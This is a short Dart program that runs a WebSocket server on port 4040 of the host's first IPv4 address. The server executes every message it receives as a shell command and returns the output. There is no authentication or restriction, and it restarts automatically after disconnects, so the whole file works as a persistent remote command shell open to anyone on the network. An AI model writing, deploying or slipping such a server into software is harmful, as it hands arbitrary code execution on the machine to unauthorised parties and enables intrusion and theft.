import 'dart:async';
import 'dart:io';
import 'package:process_run/shell.dart';
import 'package:shelf/shelf_io.dart' as shelf_io;
import 'package:shelf_web_socket/shelf_web_socket.dart';

void main() async {
  // Obtain the first IPv4 address
  String ipAddress = await getFirstIPv4Address();

  // Start the server
  startWebSocketServer(ipAddress, 4040);
}

Future<void> startWebSocketServer(String ipAddress, int port) async {
  var handler = webSocketHandler((webSocket) {
    webSocket.stream.listen(
      (message) async {
        try {
          String response = await executeCommand(message);
          webSocket.sink.add(response);
        } catch (e) {
          webSocket.sink.add('Error: $e');
        }
      },
      onDone: () {
        // Handle disconnection
        print('WebSocket disconnected. Attempting to reconnect...');
        reconnect(ipAddress, port);
      },
      onError: (error) {
        print('Error: $error');
        reconnect(ipAddress, port);
      },
    );
  });

  shelf_io.serve(handler, ipAddress, port).then((server) {
    print('Serving at ws://${server.address.host}:${server.port}');
  });
}

void reconnect(String ipAddress, int port) {
  // Wait for a few seconds before attempting to reconnect
  Future.delayed(Duration(seconds: 5), () {
    print('Attempting to restart WebSocket server...');
    startWebSocketServer(ipAddress, port);
  });
}

Future<String> getFirstIPv4Address() async {
  for (var interface in await NetworkInterface.list()) {
    for (var addr in interface.addresses) {
      if (addr.type == InternetAddressType.IPv4) {
        return addr.address;
      }
    }
  }
  throw Exception('No IPv4 address found');
}

Future<String> executeCommand(String command) async {
  var shell = Shell();
  List<ProcessResult> result = await shell.run(command);
  return result.map((r) => r.outText.trim()).join('\n');
}
